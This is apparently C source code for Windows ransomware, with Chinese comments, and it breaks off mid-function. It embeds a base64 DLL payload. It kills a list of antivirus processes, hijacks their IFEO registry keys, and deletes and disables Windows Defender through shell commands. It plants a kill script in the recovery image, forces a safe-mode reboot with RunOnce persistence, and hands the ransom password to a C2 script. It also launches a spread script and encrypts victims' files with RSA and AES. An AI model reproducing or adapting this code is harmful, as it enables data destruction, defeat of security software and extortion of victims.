AIyTAAAAAAAAlJMAAAAAAACekwAAAAAAAKaTAAAAAAAAsJMAAAAAAAC4kwAAAAAAAMKTAAAAAAAAzJMAAAAAAADWkwAAAAAAAOCTAAAAAAAA6pMAAAAAAAD2kwAAAAAAAAKUAAAAAAAAAAAAAAAAAABMkgAAAAAAAFqSAAAAAAAAapIAAAAAAACCkgAAAAAAAJqSAAAAAAAAqpIAAAAAAADGkgAAAAAAANqSAAAAAAAA8pIAAAAAAAAKkwAAAAAAABiTAAAAAAAAIJMAAAAAAAA0kwAAAAAAAEKTAAAAAAAAVJMAAAAAAAAAAAAAAAAAAGSTAAAAAAAAcpMAAAAAAACAkwAAAAAAAIyTAAAAAAAAlJMAAAAAAACekwAAAAAAAKaTAAAAAAAAsJMAAAAAAAC4kwAAAAAAAMKTAAAAAAAAzJMAAAAAAADWkwAAAAAAAOCTAAAAAAAA6pMAAAAAAAD2kwAAAAAAAAKUAAAAAAAAAAAAAAAAAACNAENsb3NlSGFuZGxlAPoAQ3JlYXRlVGhyZWFkAAAZAURlbGV0ZUNyaXRpY2FsU2VjdGlvbgA9AUVudGVyQ3JpdGljYWxTZWN0aW9uAAB0AkdldExhc3RFcnJvcgAAegNJbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uALIDSzMyRW51bVByb2Nlc3NlcwAAugNLMzJHZXRNb2R1bGVCYXNlTmFtZVcA1gNMZWF2ZUNyaXRpY2FsU2VjdGlvbgAAKwRPcGVuUHJvY2VzcwB/BVNsZWVwAI4FVGVybWluYXRlUHJvY2VzcwAAogVUbHNHZXRWYWx1ZQDRBVZpcnR1YWxQcm90ZWN0AADTBVZpcnR1YWxRdWVyeQAAVABfX2lvYl9mdW5jAAB8AF9hbXNnX2V4aXQAAFEBX2luaXR0ZXJtAMABX2xvY2sAQwNfdW5sb2NrAB4EYWJvcnQALwRjYWxsb2MAAFcEZnJlZQAAZARmd3JpdGUAAJ4EbWVtc2V0AACzBHJlYWxsb2MA0wRzdHJsZW4AANYEc3RybmNtcAD1BHRvd2xvd2VyAAD5BHZmcHJpbnRmAAANBXdjc2NtcAAAAJAAAACQAAAAkAAAAJAAAACQAAAAkAAAAJAAAACQAAAAkAAAAJAAAACQAAAAkAAAAJAAAACQAAAAkAAAS0VSTkVMMzIuZGxsAAAAABSQAAAUkAAAFJAAABSQAAAUkAAAFJAAABSQAAAUkAAAFJAAABSQAAAUkAAAFJAAABSQAAAUkAAAFJAAABSQAABtc3ZjcnQuZGxsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEKMZAwAAAAAAAAAAAAAAAAAAAAAAAABwFqMZAwAAAEAWoxkDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAwAAACIpQAAADAAABQAAAAQoECgUKBYoGCgAAAAQAAAfAAAAMClyKXQpdil4KXopfCl+KUApgimEKYYpiCmKKYwpjimQKZIplCmWKZgpmimcKZ4poCmiKaQppimoKaoprCmuKbApsim0KbYpuCm6KbwpgCnIKcopzCnOKfAqNCo4KjwqACpEKkgqTCpQKlQqWCpcKmAqZCpAKAAABAAAAAYoDCgOKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=";

// ==================== 全局变量 ====================
char g_sys_drive[4];
char g_work_dir[MAX_PATH];
char g_system32_dir[MAX_PATH];
char g_dll_target[MAX_PATH];
char g_self_path[MAX_PATH];
char g_python_path[MAX_PATH];
char g_scripts_dir[MAX_PATH];
char g_c2_network_dir[MAX_PATH];
char g_ransom_password[RANSOM_PASSWORD_LEN + 1];

char g_flag_first_run[MAX_PATH];
char g_flag_defender_killed[MAX_PATH];
char g_flag_encrypted[MAX_PATH];
char g_flag_scheduled_triggered[MAX_PATH];

char g_pubkey_file[MAX_PATH];
char g_privkey_file[MAX_PATH];

// 杀软进程黑名单
const char* av_list[] = {
    "msmpeng.exe", "nissrv.exe", "securityhealthservice.exe",
    "avguard.exe", "avgnt.exe", "vsserv.exe", "bdagent.exe",
    "egui.exe", "ekrn.exe", "mcshield.exe", "avp.exe", "avpui.exe",
    "360tray.exe", "360safe.exe", "qqpcrtp.exe", "qqpcmgr.exe",
    "ksafe.exe", "hipsdaemon.exe", "hipsmain.exe", "wsctrl.exe",
    "usysdiag.exe", "usysmd.exe", "usysmon.exe",
    "lenovopcmanager.exe", NULL
};

// ==================== 工具函数 ====================
void log_write(const char* fmt, ...) {
    char path[MAX_PATH];
    sprintf(path, "%s\\%s", g_work_dir, LOG_FILE);
    HANDLE hFile = CreateFileA(path, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    char buf[1024];
    SYSTEMTIME st; GetLocalTime(&st);
    int len = sprintf(buf, "[%02d:%02d:%02d] ", st.wHour, st.wMinute, st.wSecond);
    va_list ap; va_start(ap, fmt);
    len += vsnprintf(buf + len, sizeof(buf) - len - 2, fmt, ap);
    va_end(ap);
    buf[len++] = '\r';
    buf[len++] = '\n';
    DWORD written;
    WriteFile(hFile, buf, len, &written, NULL);
    CloseHandle(hFile);
}

void gen_random_hex(char* out, int len) {
    static const char hex[] = "0123456789abcdef";
    for (int i = 0; i < len; i++) out[i] = hex[rand() % 16];
    out[len] = 0;
}

void get_dynamic_paths() {
    char sysdir[MAX_PATH];
    GetSystemDirectoryA(sysdir, MAX_PATH);
    g_sys_drive[0] = sysdir[0]; g_sys_drive[1] = ':'; g_sys_drive[2] = 0;

    sprintf(g_system32_dir, "%s\\Windows\\System32", g_sys_drive);
    sprintf(g_dll_target, "%s%s", g_sys_drive, DLL_TARGET_REL);

    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    sprintf(g_work_dir, "%s%s%d", tmp, WORK_DIR_PREFIX, GetCurrentProcessId());
    CreateDirectoryA(g_work_dir, NULL);
    SetFileAttributesA(g_work_dir, FILE_ATTRIBUTE_HIDDEN);

    GetModuleFileNameA(NULL, g_self_path, MAX_PATH);

    // scripts 目录
    strcpy(g_scripts_dir, g_self_path);
    char* slash = strrchr(g_scripts_dir, '\\');
    if (slash) *slash = 0;
    strcat(g_scripts_dir, "\\scripts");

    // c2_network 目录
    strcpy(g_c2_network_dir, g_self_path);
    slash = strrchr(g_c2_network_dir, '\\');
    if (slash) *slash = 0;
    strcat(g_c2_network_dir, "\\c2_network");

    // Python 解释器
    strcpy(g_python_path, g_self_path);
    slash = strrchr(g_python_path, '\\');
    if (slash) *slash = 0;
    strcat(g_python_path, "\\python-embed\\python.exe");
    if (!PathFileExistsA(g_python_path))
        strcpy(g_python_path, "python.exe");

    // 标志文件
    sprintf(g_flag_first_run, "%s\\first_run.flag", g_work_dir);
    sprintf(g_flag_defender_killed, "%s\\defender_killed.flag", g_work_dir);
    sprintf(g_flag_encrypted, "%s\\encrypted.flag", g_work_dir);
    sprintf(g_flag_scheduled_triggered, "%s\\scheduled_triggered.flag", g_work_dir);
    sprintf(g_pubkey_file, "%s\\pub.key", g_work_dir);
    sprintf(g_privkey_file, "%s\\priv.key", g_work_dir);
}

BOOL is_admin() {
    HANDLE tok = NULL;
    BOOL ret = FALSE;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) {
        TOKEN_ELEVATION el; DWORD sz;
        if (GetTokenInformation(tok, TokenElevation, &el, sizeof(el), &sz))
            ret = el.TokenIsElevated;
        CloseHandle(tok);
    }
    return ret;
}

void run_as_admin() {
    ShellExecuteA(NULL, "runas", g_self_path, GetCommandLineA(), NULL, SW_SHOW);
    ExitProcess(0);
}

BOOL is_safe_mode() {
    int mode = GetSystemMetrics(67);
    log_write("Boot mode: %d", mode);
    return mode != 0;
}

BOOL is_debugging() { return IsDebuggerPresent(); }

void kill_process_by_name(const char* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(snap, &pe)) do {
        if (_stricmp(pe.szExeFile, name) == 0) {
            HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
            if (h) { TerminateProcess(h, 0); CloseHandle(h); log_write("Killed: %s", name); }
        }
    } while (Process32Next(snap, &pe));
    CloseHandle(snap);
}

void kill_all_av() {
    for (int i = 0; av_list[i]; i++) kill_process_by_name(av_list[i]);
}

// ==================== 释放内嵌 DLL ====================
BOOL deploy_dll_from_base64() {
    if (!EMBEDDED_DLL_B64 || strlen(EMBEDDED_DLL_B64) == 0) {
        log_write("No embedded DLL, skip");
        return FALSE;
    }
    DWORD declen = 0;
    if (!CryptStringToBinaryA(EMBEDDED_DLL_B64, (DWORD)strlen(EMBEDDED_DLL_B64), CRYPT_STRING_BASE64, NULL, &declen, NULL, NULL))
        return FALSE;
    BYTE* buf = (BYTE*)malloc(declen);
    if (!buf) return FALSE;
    if (!CryptStringToBinaryA(EMBEDDED_DLL_B64, (DWORD)strlen(EMBEDDED_DLL_B64), CRYPT_STRING_BASE64, buf, &declen, NULL, NULL)) {
        free(buf); return FALSE;
    }
    HANDLE hf = CreateFileA(g_dll_target, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) { free(buf); return FALSE; }
    DWORD written = 0;
    WriteFile(hf, buf, declen, &written, NULL);
    CloseHandle(hf); free(buf);
    log_write("DLL deployed to %s", g_dll_target);
    return TRUE;
}

// ==================== IFEO 劫持 ====================
void ifeo_hijack() {
    HKEY hk;
    for (int i = 0; av_list[i]; i++) {
        char key[512];
        sprintf(key, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s", av_list[i]);
        if (RegCreateKeyA(HKEY_LOCAL_MACHINE, key, &hk) == ERROR_SUCCESS) {
            char cmd[MAX_PATH];
            sprintf(cmd, "rundll32.exe %s,DllMain", g_dll_target);
            RegSetValueExA(hk, "Debugger", 0, REG_SZ, (BYTE*)cmd, (DWORD)strlen(cmd) + 1);
            RegCloseKey(hk);
            log_write("IFEO: %s", av_list[i]);
        }
    }
}

// ==================== 直接暴力击杀 Defender ====================
void kill_defender_direct() {
    log_write("Direct kill Defender...");
    kill_process_by_name("msmpeng.exe");
    kill_process_by_name("nissrv.exe");
    kill_process_by_name("securityhealthservice.exe");

    char path[MAX_PATH];
    sprintf(path, "%s\\ProgramData\\Microsoft\\Windows Defender\\Platform", g_sys_drive);
    SHFILEOPSTRUCTA op = { NULL, FO_DELETE, path, "", FOF_SILENT | FOF_NOERRORUI | FOF_NOCONFIRMATION, 0, NULL, "" };
    SHFileOperationA(&op);

    sprintf(path, "%s\\Program Files\\Windows Defender\\*", g_sys_drive);
    SHFileOperationA(&op);

    system("sc config WinDefend start= disabled >nul 2>&1");
    system("sc stop WinDefend >nul 2>&1");
    system("sc config WdFilter start= disabled >nul 2>&1");
    system("schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\*\" /f >nul 2>&1");

    system("reg load HKLM\\DEFTEMP \"C:\\Windows\\System32\\config\\SYSTEM\" >nul 2>&1");
    system("reg add HKLM\\DEFTEMP\\ControlSet001\\Services\\WinDefend /v Start /t REG_DWORD /d 4 /f >nul 2>&1");
    system("reg unload HKLM\\DEFTEMP >nul 2>&1");

    log_write("Defender directly killed");
}

// ==================== WinRE 注入击杀脚本 ====================
BOOL inject_re_kill_script() {
    log_write("Inject RE kill script...");
    char winre[MAX_PATH];
    sprintf(winre, "%s\\Windows\\System32\\Recovery\\Winre.wim", g_sys_drive);
    if (!PathFileExistsA(winre)) { log_write("Winre.wim not found"); return FALSE; }

    char mount[MAX_PATH];
    sprintf(mount, "%s\\re_mount", g_work_dir);
    CreateDirectoryA(mount, NULL);
    char cmd[512];
    sprintf(cmd, "dism /Mount-Image /ImageFile:\"%s\" /Index:1 /MountDir:\"%s\"", winre, mount);
    system(cmd);

    char bat[MAX_PATH];
    sprintf(bat, "%s\\Windows\\System32\\kill_av.bat", mount);
    FILE* f = fopen(bat, "w");
    if (f) {
        fprintf(f, "@echo off\n");
        fprintf(f, "for %%%%d in (C D E F G H I J K L) do if exist \"%%%%d:\\Windows\\System32\\winload.exe\" set sd=%%%%d:\n");
        fprintf(f, "del /f /q \"%%sd%%\\ProgramData\\Microsoft\\Windows Defender\\Platform\\*\" >nul 2>&1\n");
        fprintf(f, "reg load HKLM\\TMP \"%%sd%%\\Windows\\System32\\config\\SYSTEM\" >nul 2>&1\n");
        fprintf(f, "reg add HKLM\\TMP\\ControlSet001\\Services\\WinDefend /v Start /t REG_DWORD /d 4 /f >nul 2>&1\n");
        fprintf(f, "reg unload HKLM\\TMP >nul 2>&1\n");
        fprintf(f, "shutdown /r /t 3\n");
        fclose(f);
    }

    char ini[MAX_PATH];
    sprintf(ini, "%s\\Windows\\System32\\winpeshl.ini", mount);
    f = fopen(ini, "w");
    if (f) { fprintf(f, "[LaunchApps]\n%%windir%%\\system32\\kill_av.bat\n"); fclose(f); }

    sprintf(cmd, "dism /Unmount-Image /MountDir:\"%s\" /Commit", mount);
    system(cmd);
    RemoveDirectoryA(mount);
    log_write("RE kill script injected");
    return TRUE;
}

// ==================== 确保 Defender 死透 ====================
void ensure_defender_dead() {
    if (PathFileExistsA(g_flag_defender_killed)) return;

    deploy_dll_from_base64();
    kill_all_av();
    ifeo_hijack();

    if (is_safe_mode()) {
        kill_defender_direct();
        HANDLE hf = CreateFileA(g_flag_defender_killed, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf != INVALID_HANDLE_VALUE) CloseHandle(hf);
        log_write("Defender killed in safe mode");
    } else {
        inject_re_kill_script();
        system("bcdedit /set {current} safeboot minimal");
        HKEY hk;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
            RegSetValueExA(hk, "SilverFoxKill", 0, REG_SZ, (BYTE*)g_self_path, (DWORD)strlen(g_self_path) + 1);
            RegCloseKey(hk);
        }
        system("shutdown /r /t 10");
        ExitProcess(0);
    }
}

// ==================== 网络检测（简单 Socket 连接） ====================
BOOL has_internet() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return FALSE;

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return FALSE;
    }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(53);
    addr.sin_addr.s_addr = inet_addr("8.8.8.8");

    int timeout = 2000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));

    int result = connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    closesocket(sock);
    WSACleanup();

    if (result == 0) {
        log_write("Internet: connected");
        return TRUE;
    }
    log_write("Internet: no connection");
    return FALSE;
}

// ==================== C2 通信（调用 Python 脚本） ====================
void do_c2_report() {
    if (!has_internet()) {
        log_write("No internet, skip C2 report");
        return;
    }
    log_write("Calling Python C2 client...");
    char script[MAX_PATH];
    sprintf(script, "%s\\c2_client.py", g_c2_network_dir);
    char cmd[1024];
    sprintf(cmd, "\"%s\" \"%s\" %s %s", g_python_path, script, g_ransom_password, g_sys_drive);
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
}

// ==================== 调用 Python 脚本（通用） ====================
void run_python_script(const char* script_name) {
    char script[MAX_PATH];
    sprintf(script, "%s\\%s", g_scripts_dir, script_name);
    char cmd[1024];
    sprintf(cmd, "\"%s\" \"%s\"", g_python_path, script);
    log_write("Call Python: %s", cmd);
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
}

// ==================== 网络传播（调用 Python） ====================
void do_spread() {
    if (!has_internet()) {
        log_write("No internet, skip spread");
        return;
    }
    log_write("Calling spread script...");
    run_python_script("spread.py");
}

// ==================== RSA + AES 混合加密核心 ====================
BOOL generate_rsa_keypair() {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    if (!CryptAcquireContextA(&hProv, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, CRYPT_NEWKEYSET))
        if (!CryptAcquireContextA(&hProv, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, 0))
            return FALSE;
    if (!CryptGenKey(hProv, AT_KEYEXCHANGE, CRYPT_EXPORTABLE | (2048 << 16), &hKey)) {
        CryptReleaseContext(hProv, 0); return FALSE;
    }

    DWORD pubLen = 0;
    CryptExportKey(hKey, 0, PUBLICKEYBLOB, 0, NULL, &pubLen);
    BYTE* pubBlob = (BYTE*)malloc(pubLen);
    CryptExportKey(hKey, 0, PUBLICKEYBLOB, 0, pubBlob, &pubLen);
    HANDLE hf = CreateFileA(g_pubkey_file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD written;
    WriteFile(hf, pubBlob, pubLen, &written, NULL); CloseHandle(hf); free(pubBlob);

    DWORD privLen = 0;
    CryptExportKey(hKey, 0, PRIVATEKEYBLOB, 0, NULL, &privLen);
    BYTE* privBlob = (BYTE*)malloc(privLen);
    CryptExportKey(hKey, 0, PRIVATEKEYBLOB, 0, privBlob, &privLen);
    hf = CreateFileA(g_privkey_file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(hf, privBlob, privLen, &written, NULL); CloseHandle(hf); free(privBlob);

    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);
    log_write("RSA-2048 keypair generated");
    return TRUE;
}

HCRYPTKEY load_public_key() {
    HANDLE hf = CreateFileA(g_pubkey_file, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return 0;
    DWORD size = GetFileSize(hf, NULL);
    BYTE* buf = (BYTE*)malloc(size);
    DWORD read;
    ReadFile(hf, buf, size, &read, NULL); CloseHandle(hf);
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    CryptAcquireContextA(&hProv, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, 0);
    CryptImportKey(hProv, buf, size, 0, 0, &hKey);
    free(buf);
    return hKey;
}

HCRYPTKEY load_private_key() {
    HANDLE hf = CreateFileA(g_privkey_file, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return 0;
    DWORD size = GetFileSize(hf, NULL);
    BYTE* buf = (BYTE*)malloc(size);
    DWORD read;
    ReadFile(hf, buf, size, &read, NULL); CloseHandle(hf);
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    CryptAcquireContextA(&hProv, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, 0);
    CryptImportKey(hProv, buf, size, 0, 0, &hKey);
    free(buf);
    return hKey;
}

BOOL encrypt_file(const char* path, HCRYPTKEY hRsaPub) {
    char encPath[MAX_PATH];
    sprintf(encPath, "%s%s", path, ENC_MARKER);
    if (PathFileExistsA(encPath)) return TRUE;

    HANDLE hSrc = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hSrc == INVALID_HANDLE_VALUE) return FALSE;
    DWORD srcSize = GetFileSize(hSrc, NULL);
    if (srcSize == 0) { CloseHandle(hSrc); return FALSE; }

    char tmpPath[MAX_PATH];
    sprintf(tmpPath, "%s.tmp", path);
    HANDLE hDst = CreateFileA(tmpPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDst == INVALID_HANDLE_VALUE) { CloseHandle(hSrc); return FALSE; }

    BYTE sizeHeader[8];
    for (int i = 7; i >= 0; i--) { sizeHeader[i] = srcSize & 0xFF; srcSize >>= 8; }
    DWORD written;
    WriteFile(hDst, sizeHeader, 8, &written, NULL);

    HCRYPTPROV hProv = 0;
    CryptAcquireContextA(&hProv, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, 0);

    SetFilePointer(hSrc, 0, NULL, FILE_BEGIN);
    BYTE* chunk = (BYTE*)malloc(CHUNK_SIZE);
    DWORD readBytes;

    while (ReadFile(hSrc, chunk, CHUNK_SIZE, &readBytes, NULL) && readBytes > 0) {
        HCRYPTKEY hAes = 0;
        CryptGenKey(hProv, CALG_AES_256, CRYPT_EXPORTABLE, &hAes);

        DWORD encKeyLen = 0;
        CryptExportKey(hAes, hRsaPub, SIMPLEBLOB, 0, NULL, &encKeyLen);
        BYTE* encKeyBlob = (BYTE*)malloc(encKeyLen);
        CryptExportKey(hAes, hRsaPub, SIMPLEBLOB, 0, encKeyBlob, &encKeyLen);

        WORD keyLenLow = (WORD)encKeyLen;
        WriteFile(hDst, &keyLenLow, 2, &written, NULL);
        WriteFile(hDst, encKeyBlob, encKeyLen, &written, NULL);
        free(encKeyBlob);

        DWORD encChunkSize = readBytes;
        CryptEncrypt(hAes, 0, TRUE, 0, NULL, &encChunkSize, 0);
        BYTE* encChunk = (BYTE*)malloc(encChunkSize);
        memcpy(encChunk, chunk, readBytes);
        DWORD finalSize = readBytes;
        CryptEncrypt(hAes, 0, TRUE, 0, encChunk, &finalSize, encChunkSize);
        WriteFile(hDst, encChunk, finalSize, &written, NULL);
        free(encChunk);
        CryptDestroyKey(hAes);
    }

    free(chunk);
    CryptReleaseContext(hProv, 0);
    CloseHandle(hSrc);
    CloseHandle(hDst);

    MoveFileA(path, encPath);
    MoveFileA(tmpPath, path);
    return TRUE;
}

BOOL decrypt_file(const char* path, HCRYPTKEY hRsaPriv) {
    char encPath[MAX_PATH];
    sprintf(encPath, "%s%s", path, ENC_MARKER);
    if (!PathFileExistsA(encPath)) return TRUE;

    HANDLE hSrc = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hSrc == INVALID_HANDLE_VALUE) return FALSE;
    BYTE sizeHeader[8];
    DWORD read;
    ReadFile(hSrc, sizeHeader, 8, &read, NULL);
    DWORD64 origSize = 0;
    for (int i = 0; i < 8; i++) origSize = (origSize << 8) | sizeHeader[i];

    char tmpPath[MAX_PATH];
    sprintf(tmpPath, "%s.tmp", path);
    HANDLE hDst = CreateFileA(tmpPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDst == INVALID_HANDLE_VALUE) { CloseHandle(hSrc); return FALSE; }

    HCRYPTPROV hProv = 0;
    CryptAcquireContextA(&hProv, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, 0);
    DWORD64 totalWritten = 0;

    while (totalWritten < origSize) {
        WORD keyLen;
        if (!ReadFile(hSrc, &keyLen, 2, &read, NULL) || read != 2) break;
        BYTE* encKeyBlob = (BYTE*)malloc(keyLen);
        if (!ReadFile(hSrc, encKeyBlob, keyLen, &read, NULL) || read != keyLen) { free(encKeyBlob); break; }

        HCRYPTKEY hAes = 0;
        CryptImportKey(hProv, encKeyBlob, keyLen, hRsaPriv, 0, &hAes);
        free(encKeyBlob);
        if (!hAes) break;

        BYTE* encData = (BYTE*)malloc(CHUNK_SIZE + 256);
        DWORD totalRead = 0;
        DWORD remaining = (DWORD)(origSize - totalWritten);
        if (remaining > CHUNK_SIZE) remaining = CHUNK_SIZE;
        if (!ReadFile(hSrc, encData, remaining + 256, &totalRead, NULL) || totalRead == 0) {
            free(encData); CryptDestroyKey(hAes); break;
        }

        DWORD decSize = totalRead;
        CryptDecrypt(hAes, 0, TRUE, 0, encData, &decSize);
        WriteFile(hDst, encData, decSize, &read, NULL);
        totalWritten += decSize;
        free(encData);
        CryptDestroyKey(hAes);
    }

    CryptReleaseContext(hProv, 0);
    CloseHandle(hSrc);
    CloseHandle(hDst);

    if (totalWritten == origSize) {
        MoveFileA(path, encPath);
        MoveFileA(tmpPath, path);
        DeleteFileA(encPath);
        return TRUE;
    }
    DeleteFileA(tmpPath);
    return FALSE;
}

void collect_files(char files[][MAX_PATH], int* count, int maxCount) {
    *count = 0;
    char searchRoot[4] = "C:\\";
    char excludeDirs[][32] = { "Windows", "Program Files", "Program Files (x86)", "ProgramData", "$Recycle.Bin", "System Volume Information", "Recovery", "boot", "Boot", "Documents and Settings", "PerfLogs" };
    int exCount = sizeof(excludeDirs) / sizeof(excludeDirs[0]);

    for (char drive = 'C'; drive <= 'Z'; drive++) {
        searchRoot[0] = drive;
        if (!PathFileExistsA(searchRoot)) continue;
        WIN32_FIND_DATAA fd;
        char pattern[MAX_PATH];
        sprintf(pattern, "%s*", searchRoot);
        HANDLE hFind = FindFirstFileA(pattern, &fd);
        if (hFind == INVALID_HANDLE_VALUE) continue;
        do {
